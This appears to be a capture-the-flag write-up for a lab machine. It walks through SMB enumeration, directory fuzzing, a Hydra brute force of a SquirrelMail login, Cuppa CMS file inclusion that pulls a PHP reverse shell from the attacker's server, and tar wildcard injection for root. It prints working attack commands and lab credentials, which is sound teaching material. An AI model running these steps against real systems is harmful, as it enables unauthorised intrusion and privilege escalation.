---
sticker: emoji//2601-fe0f
---
# ENUMERATION
---

## OPEN PORTS
---


| PORT | STATE | SERVICE                  |
| :--- | :---- | :----------------------- |
| 22   | open  | ssh                      |
| 80   | open  | http                     |
| 110  | open  | pop3                     |
| 139  | open  | netbios-ssn (Samba smbd) |
| 143  | open  | imap                     |
| 445  | open  | netbios-ssn (Samba smbd) |

We have a lot of open ports in this machine, if we try to enumerate them all:


### SMB Enumeration
---

We realized we have SMB on this machine, let's use [smbmap](https://github.com/ShawnDEvans/smbmap) or [enum4linux](https://www.kali.org/tools/enum4linux/) to enumerate what's inside this service:

![](Pasted%20image%2020241121130533.png)
We found interesting things in this, got a `milesdyson` username, and two shares: `milesdyson`, `anonymous`, let's see what the scan says about these two:

![](Pasted%20image%2020241121130647.png)

We cannot read `milesdyson` but reading `anonymous` is allowed, let's connect to smb and read this:

```ad-hint

### Connecting to SMB
---

`smbclient //IP/Anonymous`

#### Investigating the SMB
---

![](Pasted%20image%2020241121131319.png)

Got `logs` and `attention.txt`

#### `logs`

If we `cd` to logs and `ls`, we found three files:

![](Pasted%20image%2020241121131700.png)

Let's get them all using `mget *`

We'll analyze those files later, let's get our `attention.txt` file:

![](Pasted%20image%2020241121131803.png)

Nice, let's analyze those files:

#### `attention.txt`
----
![](Pasted%20image%2020241121131952.png)

Seems like a note, saying a malfunction has caused them passwords to be change, and that all employees need to change their passwords.

If we look at the logs, only log1 has something, it appears to be a wordlist of some sort of kind:

![](Pasted%20image%2020241121132133.png)

Nice, let's proceed with fuzzing.

```

## FUZZING
---

Let's begin with the fuzzing part, we can fuzz using `ffuf` `gobuster` `dirb` and some other more, let's use these three tools to get all of the hidden directories:

```ad-summary

### ffuf
---

![](Pasted%20image%2020241121134127.png)

Found a few directories, let's scan with `gobuster`

### gobuster
----

![](Pasted%20image%2020241121134245.png)
Same interesting directory again, let's scan with `dirb`

### dirb
---
![](Pasted%20image%2020241121134211.png)

Found the `squirrelmail` directory again, seems like this is our way to go, let's visit it.
```

![](Pasted%20image%2020241121134448.png)

This directory contains a login, we can try brute forcing the login page assuming the username would be `milesdyson` and the password to be inside of `log1.txt`.

```ad-hint

#### Hydra Brute Force
---

For the brute force processs, i'll be using hydra, this is the following command:

![](Pasted%20image%2020241121134929.png)

![](Pasted%20image%2020241121134940.png)

This is a `POST` request, with the parameters: `login_username`, `secretkey`, so, the hydra command would be the following:

`hydra -l milesdyson -P log1.txt IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20`

For this machine I used:

`hydra -l milesdyson -P log1.txt 10.10.183.201 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20`

#### Output
---

![](Pasted%20image%2020241121135155.png)

We found our `milesdyson` username password, credentials would be the following:

`milesdyson`: `cyborg007haloterminator`


```

# RECONNAISSANCE
---

Once we got our credentials, let's log in and perform the reconnaissance of the machine:

![](Pasted%20image%2020241121135455.png)

Once we are inside the page, we found that this is hosted on a `webmail.php` section, we got three emails, most jazzy one would be the Samba Password reset, let's look at it:

![](Pasted%20image%2020241121135646.png)

So we got a password, `)s{A&2Z=F^n_E.B` this is `milesdyson` samba password, let's log into SMB using those credentials

```ad-note
##### Credentials
---

`milesdyson` : )s{A&2Z=F^n_E.B`

![](Pasted%20image%2020241121135937.png)

A bunch of files are inside of it, let's look for anything useful:

![](Pasted%20image%2020241121140027.png)

Bunch of stuff too, but we found something interesting a `important.txt` file, let's get it and analyze it in our machine:

![](Pasted%20image%2020241121140112.png)

We found a hidden directory: `/45kra24zxs28v3yd`, let's fuzz this directory to check if anything useful is hidding within it:

`dirb http://10.10.183.201/45kra24zxs28v3yd`

![](Pasted%20image%2020241121140644.png)

```

# EXPLOITATION
---


We found a `/administrator` directory inside, let's take a look:

![](Pasted%20image%2020241121140728.png)

This is running `Cuppa` if we use searchsploit we get this:

![](Pasted%20image%2020241121140810.png)

A [[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/FILE INCLUSION VULNERABILITIES/LOCAL FILE INCLUSION (LFI).md|LFI]] vulnerability is shown, let's read and exploit:

![](Pasted%20image%2020241121142014.png)
So, in order to exploit this and get a reverse shell, we need to follow these steps:

```ad-summary
1. Download a php reverse shell.
2. Start a server using python.
3. Start our listener
4. Request the link: `http://$ip/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$our_ip:8000/shell.php`

### Output 
----

![](Pasted%20image%2020241121142636.png)
![](Pasted%20image%2020241121142641.png)
We got our shell.

```




Once the shell connection is established, we need to stabilize our shell in order to have a better experience, let's use our [[CYBERSECURITY/Commands/Shell Tricks/STABLE SHELL.md|note]]:

![](Pasted%20image%2020241121143025.png)

Nice, now we have a stable shell, let's begin with our privilege escalation



# PRIVILEGE ESCALATION
---

## `/etc/crontab`

If we use `cat /etc/crontab` we find this:

![](Pasted%20image%2020241121143321.png)

User `root` is running a script inside of `milesdyson` home called `backup.sh` let's check if we are able to write in it:

![](Pasted%20image%2020241121143414.png)

![](Pasted%20image%2020241121143635.png)

We are able to write in it, so, we need to put the following in order to get a higher privileged shell:

```ad-hint

We need to run this commands inside of `/var/www/html`

1. printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
2. echo "" > "--checkpoint-action=exec=sh shell.sh"
3. echo "" >> --checkpoint=1

The process we followed is a `wildcard injection`, we are taking advantage of the script, which uses tar and we inject a shell that gets executed once the script runs once again.


After a minute, we will be able to execute `/bin/bash -p` and get a root shell:

#### Output
---

![](Pasted%20image%2020241121144618.png)
![](Pasted%20image%2020241121144743.png)



```

And that's all for this CTF.

